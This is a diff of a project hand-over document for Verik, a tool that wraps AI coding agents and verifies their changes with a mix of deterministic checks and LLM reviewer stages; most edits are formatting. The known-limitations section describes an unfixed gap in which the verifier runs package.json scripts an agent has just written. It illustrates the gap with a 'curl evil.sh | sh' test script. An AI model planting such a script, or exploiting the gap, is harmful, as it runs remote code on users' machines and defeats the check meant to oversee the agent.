@@ -77,13 +77,13 @@ pnpm test
 
 ## 4. How a run works
 
-1. **Snapshot before** — a real git *tree object* for the whole worktree
+1. **Snapshot before** — a real git _tree object_ for the whole worktree
    (tracked, staged and untracked alike), written to a temp index and temp object
    store so the repository is never touched. This is the baseline.
 2. **Run the wrapped command** — transparent subprocess; stdin inherited, signals
    forwarded, colours preserved. The agent has no idea Verik exists.
 3. **Snapshot after** — build a second tree and `git diff baseline final`. That
-   *is* the attributable diff: pre-existing dirt is already baked into the
+   _is_ the attributable diff: pre-existing dirt is already baked into the
    baseline tree, so everything the diff reports is by construction the command's
    doing, down to the hunk. This is the hardest correctness problem in the
    codebase and the most defensible work in it. See §11 for why the previous
@@ -92,7 +92,7 @@ pnpm test
    - **Scout** (LLM) — scope, intent, risk level, what the Reviewer should focus
      on. Recommends verification goals in plain English only; never emits shell.
    - **Builder** (deterministic, no LLM) — detects project type, maps Scout's
-     goals to *allowlisted* commands, runs your real build/test/lint, captures
+     goals to _allowlisted_ commands, runs your real build/test/lint, captures
      bounded logs.
    - **Reviewer** (LLM) — reads Scout output, Builder evidence, the diff, and
      historical findings from memory. Emits structured findings with paths, line
@@ -117,7 +117,7 @@ pnpm test
    asserted by a test. Not true of the Builder, which runs your real
    build/test and so can write `dist/`, coverage and snapshots.
 6. A stage that did not execute is never reported as passed. Extended: a check
-   whose *tool* is missing reports `unavailable`, never `failed` — absence of
+   whose _tool_ is missing reports `unavailable`, never `failed` — absence of
    evidence must not read as evidence of a defect.
 7. Pre-existing changes are never attributed to the wrapped command. Enforced
    structurally by tree diffing rather than by path arithmetic, so it now holds
@@ -177,18 +177,18 @@ scripts/          install.sh (curl installer), pkg-build.mjs (binaries)
 Stages are tiered by the capability each needs. Defaults live in
 `src/config/defaults.ts`:
 
-| Stage | Default model | Why |
-|---|---|---|
-| Scout | `claude-haiku-4-5` | Cheap triage of the diff |
-| Reviewer | `claude-sonnet-5` | The analysis pass |
-| Judge | `claude-opus-5` | The verdict is the product |
+| Stage    | Default model      | Why                        |
+| -------- | ------------------ | -------------------------- |
+| Scout    | `claude-haiku-4-5` | Cheap triage of the diff   |
+| Reviewer | `claude-sonnet-5`  | The analysis pass          |
+| Judge    | `claude-opus-5`    | The verdict is the product |
 
 **Resolution precedence:** `VERIK_MODEL_<STAGE>` env var → `config.json` →
 the default above. The string `configured-through-environment` is a legacy
 placeholder written by older `verik init` runs and is treated as "unset".
 
 > **Trap:** Sonnet 5 and Opus 5 think by default, and `max_tokens` caps thinking
-> *plus* response together. Reviewer and Judge are set to 16k for this reason.
+> _plus_ response together. Reviewer and Judge are set to 16k for this reason.
 > If you lower them, verdicts will truncate mid-sentence.
 
 Policy (`.verik/policy.json`): `shadow` (always exit 0), `advisory`
@@ -202,7 +202,7 @@ Exit codes: `0` pass/advisory · `1` internal error · `2` policy block ·
 ## 7. What is NOT done — read this before planning
 
 **The Builder executes scripts the agent just wrote.** `detectProject` reads
-`package.json` *after* the wrapped command has run, and the planner turns those
+`package.json` _after_ the wrapped command has run, and the planner turns those
 scripts into `pnpm run test` / `lint` / `build`. An agent that writes
 `"test": "curl evil.sh | sh"` gets it executed by the verifier. The allowlist in
 `command-allowlist.ts` only validates `config.builder.commands` — it never sees
@@ -238,6 +238,7 @@ chain the docs describe is half-wired.
 **No evaluation harness.** Nothing executes `datasets/evaluation/`.
 
 **Untested / unmeasured:**
+
 - Cost and latency per run — `tokenUsage` is captured per stage and shown in
   `verik inspect`, but never summed or priced. You cannot currently answer
   "what does a run cost?"
@@ -247,6 +248,7 @@ chain the docs describe is half-wired.
   unobserved.
 
 **Known limitations:**
+
 - `excludePatterns` is a denylist, which fails open, and it is load-bearing for
   the "we don't leak your secrets" claim. The shipped defaults have a concrete
   gap: `.env` matches only at the repository root. `src/.env` and
@@ -265,7 +267,7 @@ chain the docs describe is half-wired.
 - `pnpm format:check` currently fails on ~41 files of pre-existing style drift,
   so the CI `Format check` step is red independently of any change. On Windows
   this looks far worse than it is: with `core.autocrlf=true`, no `.gitattributes`
-  and no `endOfLine` in `.prettierrc`, *every* file reads as CRLF and fails
+  and no `endOfLine` in `.prettierrc`, _every_ file reads as CRLF and fails
   locally while CI sees LF.
 - Binaries cannot be built on Windows — needs Linux CI. Use npm on Windows.
 - `memory.json` writes use a file lock that times out after 10s with a warning,
@@ -283,7 +285,7 @@ have not made by hand yet.
 Take 15–20 real agent-generated diffs. Run `verik verify` on each with a
 real key. Read every finding and label it true or false positive. That single
 exercise yields three things at once: the precision number that decides whether
-this is a product, the labelled ground truth that *becomes* `datasets/evaluation/`,
+this is a product, the labelled ground truth that _becomes_ `datasets/evaluation/`,
 and direct evidence of which of the three prompts is weakest.
 
 False positives are the retention question. A verifier that flags six things
@@ -310,7 +312,7 @@ because the noise teaches people to ignore it.
   user's machine can be read; do not treat minification as protection.
 - **Terminal styling goes through `src/cli/output/theme.ts`**, which mirrors the
   HTML report's palette so a verdict is the same colour in both. When drawing
-  boxes, compute padding on raw strings *before* applying colour — chalk's escape
+  boxes, compute padding on raw strings _before_ applying colour — chalk's escape
   codes have no display width and will corrupt alignment.
 - **Colour is never the only signal** — severity and verdicts are always spelled
   out as well as tinted, so output survives `NO_COLOR`, CI logs, and colour
@@ -322,19 +324,19 @@ because the noise teaches people to ignore it.
 
 Eleven commits on `feat/verification-pipeline2`, newest first:
 
-| Commit | What |
-|---|---|
-| `85295ec` | Themed spinner with a live elapsed counter |
-| `e5e9a3c` | Visual identity: shared theme, wordmark, brand rail |
-| `c699504` | Split `prepare`/`prepack` so production installs don't fail |
-| `9a7f47b` | Terminal redesign: stage rail, verdict box, inline findings |
-| `92b977d` | Minify bundles; widen gitignore |
-| `f6c14f6` | Exclude sourcemaps from the npm package |
-| `be2fd66` | Release workflow uses pnpm, not `npm ci` |
-| `5aa95f0` | Fix install paths, add LICENSE, modernise model defaults |
+| Commit    | What                                                             |
+| --------- | ---------------------------------------------------------------- |
+| `85295ec` | Themed spinner with a live elapsed counter                       |
+| `e5e9a3c` | Visual identity: shared theme, wordmark, brand rail              |
+| `c699504` | Split `prepare`/`prepack` so production installs don't fail      |
+| `9a7f47b` | Terminal redesign: stage rail, verdict box, inline findings      |
+| `92b977d` | Minify bundles; widen gitignore                                  |
+| `f6c14f6` | Exclude sourcemaps from the npm package                          |
+| `be2fd66` | Release workflow uses pnpm, not `npm ci`                         |
+| `5aa95f0` | Fix install paths, add LICENSE, modernise model defaults         |
 | `7958240` | CI workflow, git hooks, tooling; fix 11 lint errors + flaky test |
-| `5d92080` | PR and issue templates |
-| `414d729` | The verification pipeline itself |
+| `5d92080` | PR and issue templates                                           |
+| `414d729` | The verification pipeline itself                                 |
 
 Several of these were bugs that would have broken a real user: every install URL
 pointed at a repo that doesn't exist, the release workflow would have failed on
@@ -366,13 +368,13 @@ are distinct branded types. Prompts and reports take `SafePatch`; deterministic
 secret rules and the Builder cache key deliberately take `RawPatch` — a rule that
 only sees `[REDACTED]` can never fire, and hashing a redacted patch collapses
 different secrets to one cache key. `prepareSafePatch` is the only route between
-them and enforces redact-*then*-truncate, because truncating first can cut a
+them and enforces redact-_then_-truncate, because truncating first can cut a
 private-key block before its `-----END`, which both the regex and the block
 tracker depend on.
 
 **Verifying the fix found a second leak.** With the diff clean, a smoke test
 still showed secrets in `report.{json,md,html}`: `wrappedCommand` was echoed
-verbatim into all three *and* into the Scout prompt, so a token passed as a CLI
+verbatim into all three _and_ into the Scout prompt, so a token passed as a CLI
 flag went to the API. Now redacted at those four sites; raw argv is retained in
 `metadata.json`, which is local forensics.
 
@@ -382,11 +384,12 @@ for lack of verification signal — but the true cause was that `pnpm` was not o
 PATH. On Windows cross-spawn routes an unresolvable command through `cmd.exe`,
 which exits 1 identically to a genuine test failure. `executable-lookup.ts` now
 resolves the binary first and reports the schema's previously-unused
-`unavailable` status, which produces a *limitation* rather than *evidence*.
+`unavailable` status, which produces a _limitation_ rather than _evidence_.
 Builder limitations are now also passed to the Reviewer and Judge prompts, which
 never saw them.
 
 **Deliberate design choices, so they are not "fixed" by mistake:**
+
 - `.verik/runs/<id>/diff.patch` stays **unredacted**. It is gitignored,
   local, and a redacted forensic artifact is worse than useless when triaging a
   leak. Everything that leaves the machine is sanitised; this does not leave.
